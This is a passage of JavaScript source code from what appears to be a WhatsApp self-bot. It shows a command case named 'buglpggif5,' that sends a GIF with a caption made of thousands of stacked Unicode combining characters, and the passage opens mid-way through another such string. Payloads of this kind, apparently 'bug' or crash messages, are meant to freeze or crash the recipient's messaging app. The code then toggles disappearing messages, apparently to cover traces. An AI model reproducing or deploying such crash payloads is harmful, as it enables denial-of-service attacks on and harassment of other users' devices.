̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾', quoted: dap})				
				await client.toggleDisappearingMessages(from, 0)
                await client.toggleDisappearingMessages(from, 0)
		        break;
				case 'buglpggif5,':	
				 if (!mek.key.fromMe) return fakestatus("SELF-BOT");	                 									
				anu = await getBuffer(`https://i.ibb.co/3kk2jsP/gif.gif`)
				client.sendMessage(from, anu, gif, {caption: '🕯️۞͓͓͓͓͖͖͖̈́̈́̈́̈́͗͗͗͗͗͗͗͗͗͗LPG௦̴̧̫̫̫̫̦̪̪̞̪̭̪̙̜̖̖̩̬̩̭̞̗̝̐̐̑̕۞͓͓͓͓͖͖͖̈́̈́̈́̈́͗͗͗͗͗͗͗͗͗͗🕯️ 🌑͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛